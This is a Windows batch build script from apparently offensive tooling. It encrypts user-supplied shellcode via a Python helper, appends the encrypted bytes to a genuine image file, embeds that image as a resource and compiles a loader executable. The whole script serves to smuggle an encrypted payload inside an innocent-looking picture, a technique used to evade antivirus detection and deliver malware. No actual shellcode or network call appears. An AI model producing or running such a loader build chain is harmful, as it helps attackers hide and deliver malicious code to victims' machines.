@echo off
setlocal enabledelayedexpansion

if "%~2"=="" (
    echo Usage: .\compile-executable.cmd [target filename] [encryption key] '[shellcode]'
    echo Example Usage: .\compile-executable.cmd minion.jpg mysecretkey '0x41 0x41 0x41'
    echo Exiting...
    exit /b 1
)

set "targetfile=%~1"
set "key=%~2"
set "shellcode=%~3"
set "script_dir=%~dp0"

REM Validate user input
if not "!targetfile!" == "!targetfile:~0,255!" (
    echo Error: Invalid target filename.
    echo Exiting...
    exit /b 1
)
powershell -Command "$f='%targetfile%'; $b=[System.IO.File]::ReadAllBytes($f)[0..3]; if (($b -join ' ') -match '^(255 216 255|137 80 78 71|71 73 70 56|66 77)') { exit 0 } else { exit 1 }"
if %errorlevel% neq 0 (
    echo Error: Target file is not a valid image.
    echo Exiting...
    exit /b 1
)
powershell -Command "$s='%shellcode%'; if ($s -match '^((0x[0-9A-Fa-f]{2})\s*)+$') { exit 0 } else { exit 1 }"
if %errorlevel% neq 0 (
    echo Error: Invalid shellcode format. Expected "0xXX 0xYY 0xZZ"
    echo Exiting...
    exit /b 1
)
if not exist "%targetfile%" (
    echo Error: Target file does not exist.
    echo Exiting...
    exit /b 1
)

REM Encrypt shellcode and write into shellcode.bin
python3 encrypt-shellcode.py "%key%" "%shellcode%"
if not exist shellcode.bin (
    echo Error: shellcode.bin not generated by encrypt-shellcode.py.
    echo Exiting...
    exit /b 1
)

for %%I in (shellcode.bin) do set shellcode_len=%%~zI
for /f %%a in ('powershell -Command "('{0:X}' -f %shellcode_len%)"') do set "shellcode_len_hex=0x%%a"
for %%F in ("%targetfile%") do set "targetfile_noext=%%~nF"

REM Append encrypted shellcode to target file
type shellcode.bin >> "%targetfile%"

REM Create resource script
(
    echo #include ^<windows.h^>
    echo !targetfile_noext! RCDATA "%targetfile%"
) > resource.rc

REM Compile the resource script using windres
windres resource.rc -O coff -o resource.res

REM Compile executable with g++
g++ -DSHELLCODE_LEN=%shellcode_len_hex% -DRESOURCE_NAME="L\"%targetfile_noext%\"" -DENCRYPTION_KEY=\"%key%\" "%script_dir%executable.cpp" "%script_dir%resource.res" -o "%script_dir%executable.exe" -static-libgcc -static-libstdc++

if !errorlevel! equ 0 (
    echo Compilation successful!
    echo Appended shellcode to %targetfile%...
    echo Successfuly compiled executable.exe...
) else (
    echo Compilation failed. Check for errors.
)

REM Delete temporary files
del %script_dir%shellcode.bin
del %script_dir%resource.rc
del %script_dir%resource.res